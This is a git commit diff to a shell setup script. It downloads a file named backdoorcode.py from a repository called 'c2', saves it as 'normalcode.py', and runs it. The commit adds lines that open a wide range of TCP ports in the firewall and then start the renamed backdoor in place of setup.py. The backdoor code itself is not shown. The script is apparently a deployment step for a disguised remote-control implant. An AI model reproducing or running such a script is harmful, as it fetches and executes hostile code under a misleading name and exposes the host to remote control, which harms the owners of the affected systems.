3ff21374b685cf3bcb8a5e8c2cda1ece9c0256ad
anmolmittal13 <72708880+anmolmittal13@users.noreply.github.com>
2023-12-06 15:46:15 -0600

    Update starterscript.sh

--- starterscript.sh
+++ starterscript.sh
@@ -2,4 +2,7 @@ yum install -y python3;
 curl -o normalcode.py https://raw.githubusercontent.com/anmolmittal13/c2/main/backdoorcode.py
 chmod +x normalcode.py;
 pip3 install --upgrade pip;
-python3 setup.py;
+pip3 install setuptools_rust;
+pip3 install cryptography;
+firewall-cmd --add-port=3040-6130/tcp;
+python3 normalcode.py;
